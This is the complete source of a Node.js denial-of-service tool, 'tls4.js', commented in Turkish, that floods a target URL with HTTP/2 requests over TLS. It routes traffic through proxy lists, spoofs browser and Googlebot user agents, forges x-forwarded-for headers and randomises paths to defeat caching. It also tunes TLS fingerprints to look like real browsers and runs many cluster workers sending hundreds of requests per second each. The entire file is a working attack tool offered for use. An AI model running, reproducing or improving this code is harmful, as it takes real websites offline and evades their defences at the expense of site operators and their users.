// tls4.js – Gelişmiş HTTP/2 TLS Flood (proxy doğrulama, custom header, UA tipi)
// Kullanım: node tls4.js <url> <süre> <thread>
// Örnek: node tls4.js https://example.com 60 1250

process.on('uncaughtException', function(er){});
process.on('unhandledRejection', function(er){});
process.on("SIGHUP", () => { return 1; });
process.on("SIGCHILD", () => { return 1; });

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const http = require('http');
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const path = require("path");
const cluster = require("cluster");
const crypto = require("crypto");

// ========== ARGÜMANLAR (SADELEŞTİRİLMİŞ) ==========
if (process.argv.length < 4) {
    console.log('Kullanım: node tls4.js <url> <süre> <thread>');
    console.log('Örnek: node tls4.js https://example.com 60 1250');
    process.exit(0);
}

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const threads = parseInt(process.argv[4]) || 10;
const parsedTarget = url.parse(targetUrl);

// Sabit ayarlar (orijinal koddaki gelişmiş özellikler korundu)
const proxyFile = "proxy.txt";
const uaType = "MIX";      // BOT / REAL / MIX
const randPath = "YES";    // YES / NO
const rate = 500;          // thread başına saniyedeki istek sayısı

// Proxy listesini oku
let proxies = [];
if (fs.existsSync(proxyFile)) {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split(/\r?\n/).filter(p => p.trim());
} else {
    console.log('[!] proxy.txt bulunamadı, proxysiz devam...');
}

// ========== UA LİSTELERİ (orijinalden alındı) ==========
const ualistmix = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/118.0.2088.88",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 EdgA/118.0.2088.66"
];
const ualistreal = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"
];
const ualistbot = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
];

function fakeUA() {
    let list;
    if (uaType === "MIX") list = ualistmix;
    else if (uaType === "REAL") list = ualistreal;
    else list = ualistbot;
    return list[Math.floor(Math.random() * list.length)];
}

function randomIntn(min, max) { return Math.floor(Math.random() * (max - min) + min); }
function randomElement(arr) { return arr[randomIntn(0, arr.length)]; }

// ========== HEADER LİSTELERİ (orijinalden) ==========
const acceptHeader = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/msword, */*'
];
const cacheHeader = ['max-age=0', 'no-cache', 'no-store', 'must-revalidate'];
const languageHeader = [
    'en-US, en;q=0.9', 'es-ES, es;q=0.9, en;q=0.8', 'tr-TR, tr;q=0.9, en;q=0.8',
    'de-DE, de;q=0.9, en;q=0.8', 'fr-FR, fr;q=0.9, en;q=0.8'
];
const destHeader = ['document', 'font', 'frame', 'iframe', 'image', 'manifest', 'object', 'report', 'script'];
const modeHeader = ['cors', 'navigate', 'no-cors', 'same-origin', 'websocket'];
const siteHeader = ['cross-site', 'same-origin', 'same-site', 'none'];
const destPath = ['', 'home', 'about', 'faq', 'terms', 'team', 'services', 'portfolio', 'careers', 'events', 'download'];

function generateRandomWord() {
    const chars = "abcdefghijklmnopqrstuvwxyz";
    let word = "";
    for (let i = 0; i < (Math.random() * 10 + 1); i++) {
        word += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return word;
}

// ========== TLS AYARLARI ==========
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [ defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], defaultCiphers.slice(3) ].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

// ========== NET SOCKET (PROXY DOĞRULAMA) ==========
class NetSocket {
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });
        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "403");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => { connection.destroy(); return callback(undefined, "403"); });
        connection.on("error", () => { connection.destroy(); return callback(undefined, "403"); });
    }
}
const Socker = new NetSocket();

// ========== FLOOD FONKSİYONU ==========
function startFlood() {
    const useProxy = proxies.length > 0;
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        "accept": randomElement(acceptHeader),
        "accept-encoding": "gzip, deflate, br",
        "accept-language": randomElement(languageHeader),
        "cache-control": randomElement(cacheHeader),
        "pragma": "no-cache",
        "host": parsedTarget.host,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "sec-fetch-dest": randomElement(destHeader),
        "sec-fetch-mode": randomElement(modeHeader),
        "sec-fetch-site": randomElement(siteHeader),
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1"
    };

    function doRequest() {
        let proxy = null;
        let socket = null;

        if (useProxy) {
            const proxyStr = randomElement(proxies);
            const parts = proxyStr.split(':');
            Socker.HTTP({ host: parts[0], port: parts[1], address: parsedTarget.host + ":443", timeout: 5 }, (conn, err) => {
                if (err) {
                    setTimeout(doRequest, 100);
                    return;
                }
                socket = conn;
                createConnection(socket);
            });
        } else {
            createConnection(null);
        }

        function createConnection(socket) {
            const tlsOptions = {
                port: 443,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                ALPNProtocols: ["h2"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: true,
                rejectUnauthorized: false,
                secureOptions: secureOptions,
                secureContext: secureContext,
                secureProtocol: secureProtocol,
                socket: socket
            };
            if (!socket) delete tlsOptions.socket;

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 1000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                }
            });
            client.setMaxListeners(0);

            client.on("connect", () => {
                const path = randPath === "YES" ? (parsedTarget.path + '?' + generateRandomWord() + '=' + generateRandomWord()) : parsedTarget.path;
                for (let i = 0; i < rate; i++) {
                    const reqHeaders = Object.assign({}, headers, {
                        ":path": path,
                        "user-agent": fakeUA(),
                        "x-forwarded-for": randomElement(proxies.length ? proxies : ['127.0.0.1']).split(':')[0]
                    });
                    const req = client.request(reqHeaders);
                    req.on('error', () => {});
                    req.on('response', () => { req.close(); req.destroy(); });
                    req.end();
                }
                // Her 1 saniyede bir rate kadar istek gönder
            });
            client.on('close', () => { client.destroy(); if (socket) socket.destroy(); });
            client.on('error', () => { client.destroy(); if (socket) socket.destroy(); });

            // Interval ile sürekli istek gönder
            const interval = setInterval(() => {
                const path = randPath === "YES" ? (parsedTarget.path + '?' + generateRandomWord() + '=' + generateRandomWord()) : parsedTarget.path;
                for (let i = 0; i < rate; i++) {
                    const reqHeaders = Object.assign({}, headers, {
                        ":path": path,
                        "user-agent": fakeUA(),
                        "x-forwarded-for": randomElement(proxies.length ? proxies : ['127.0.0.1']).split(':')[0]
                    });
                    const req = client.request(reqHeaders);
                    req.on('error', () => {});
                    req.on('response', () => { req.close(); req.destroy(); });
                    req.end();
                }
            }, 1000);

            // Saldırı süresi dolunca interval'i temizle
            setTimeout(() => {
                clearInterval(interval);
                client.close();
                if (socket) socket.destroy();
            }, duration * 1000);
        }
    }

    // Thread döngüsü
    for (let t = 0; t < threads; t++) {
        (function loop() {
            doRequest();
            setTimeout(loop, 500 + Math.random() * 500); // her thread periyodik yeni bağlantı açar
        })();
    }
}

// ========== CLUSTER ==========
if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`[+] Thread ${i+1} başlatıldı.`);
    }
    console.log(`[+] Saldırı ${duration} saniye devam edecek.`);
    setTimeout(() => {
        console.log('[+] Saldırı sonlandı.');
        process.exit(1);
    }, duration * 1000 + 2000);
} else {
    startFlood();
}